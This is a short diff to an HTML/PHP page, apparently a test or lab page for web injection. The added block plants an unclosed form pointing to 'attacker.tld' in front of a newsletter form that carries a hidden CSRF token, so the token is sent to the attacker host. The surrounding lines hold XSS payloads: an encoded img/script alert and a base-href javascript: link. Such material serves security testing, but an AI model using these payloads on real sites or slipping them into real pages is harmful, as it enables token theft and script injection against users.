@@ -32,6 +32,25 @@ include 'log.php';
 
   </head>
   <body>
+    
+    <html>
+
+<body>
+
+<div><form action=”http://attacker.tld”></div>
+
+<form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”>
+
+<input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” />
+
+<input type=”submit” value=”Subscribe to newsletter” />
+
+</form>
+
+</body>
+
+</html>
+      
     <p>&#x22;&#x3E;&#x3C;img src=x&#x3E;&#x3C;script&#x3E;alert(0)&#x3C;/script&#x3E;</p>
     <base href=x><a href=javascript:alert(0)><base href=x>xss</a>
 
